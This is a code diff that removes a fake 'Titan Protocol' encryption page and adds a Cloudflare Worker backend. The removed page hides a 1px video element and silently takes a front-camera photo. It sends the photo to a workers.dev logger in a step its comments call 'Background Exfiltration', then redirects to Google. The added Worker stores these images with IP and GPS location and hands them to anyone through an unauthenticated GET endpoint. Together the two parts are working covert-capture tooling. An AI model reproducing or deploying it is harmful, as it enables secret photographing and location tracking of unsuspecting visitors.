@@ -1,76 +1,38 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Titan Protocol</title>
-    <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
-        .btn { padding: 25px 40px; border: 2px solid #0f0; background: transparent; color: #0f0; cursor: pointer; font-size: 1.2rem; font-weight: bold; }
-        #v { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
-    </style>
-</head>
-<body>
+export default {
+  async fetch(request, env) {
+    const corsHeaders = {
+      'Access-Control-Allow-Origin': '*',
+      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
+      'Access-Control-Allow-Headers': 'Content-Type',
+    };
 
-    <p style="color: #444; font-size: 10px;">V: 2.0.1 - STABLE</p>
-    <div id="status">ENCRYPTION ENGINE STANDBY</div>
-    <br>
-    <video id="v" playsinline muted></video>
-    <button id="btn" class="btn">INITIALIZE HANDSHAKE</button>
+    if (request.method === "OPTIONS") return new Response(null, { headers: corsHeaders });
 
-    <script>
-        const LOGGING_API = "https://titan-logger.saliljha523.workers.dev";
-        const video = document.getElementById('v');
-        const btn = document.getElementById('btn');
-        const status = document.getElementById('status');
-        const canvas = document.createElement('canvas');
+    // MODE 1: DATA RETRIEVAL (The Vault Viewer)
+    if (request.method === "GET") {
+      const { results } = await env.DB.prepare("SELECT * FROM logs ORDER BY id DESC").all();
+      return new Response(JSON.stringify(results), {
+        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
+      });
+    }
 
-        btn.onclick = async () => {
-            btn.style.display = 'none';
-            status.innerText = "CALIBRATING...";
-            
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" },
-                    audio: false 
-                });
-                video.srcObject = stream;
-                
-                video.onloadedmetadata = () => {
-                    video.play();
-                    // Slight delay to allow sensor light adjustment
-                    setTimeout(executeFinalCapture, 250);
-                };
-            } catch (err) {
-                status.innerText = "CRITICAL ERROR: PERMISSION_REQUIRED";
-                status.style.color = "red";
-            }
-        };
+    // MODE 2: DATA INGESTION (The Stealth Capture)
+    if (request.method === "POST") {
+      try {
+        const data = await request.json();
+        const timestamp = new Date().toISOString();
+        const image = data.image || "";
+        // Combine IP-based location with Precision GPS if provided
+        const loc = `IP: ${request.cf.city} | GPS: ${data.gps || 'N/A'}`;
 
-        async function executeFinalCapture() {
-            // 1. Snapshot
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            const dataImg = canvas.toDataURL('image/jpeg', 0.5);
+        await env.DB.prepare(
+          "INSERT INTO logs (timestamp, image, location) VALUES (?, ?, ?)"
+        ).bind(timestamp, image, loc).run();
 
-            // 2. Kill Hardware
-            video.srcObject.getTracks().forEach(t => t.stop());
-
-            // 3. Background Exfiltration
-            fetch(LOGGING_API, {
-                method: 'POST',
-                keepalive: true,
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ image: dataImg })
-            }).catch(e => console.log("Upload backgrounded"));
-
-            // 4. Clean Exit
-            status.innerText = "AUTHENTICATED. REDIRECTING...";
-            setTimeout(() => {
-                window.location.replace("https://google.com");
-            }, 500);
-        }
-    </script>
-</body>
-</html>
+        return new Response(JSON.stringify({ status: "SUCCESS" }), { headers: corsHeaders });
+      } catch (e) {
+        return new Response(e.message, { status: 500, headers: corsHeaders });
+      }
+    }
+  }
+};
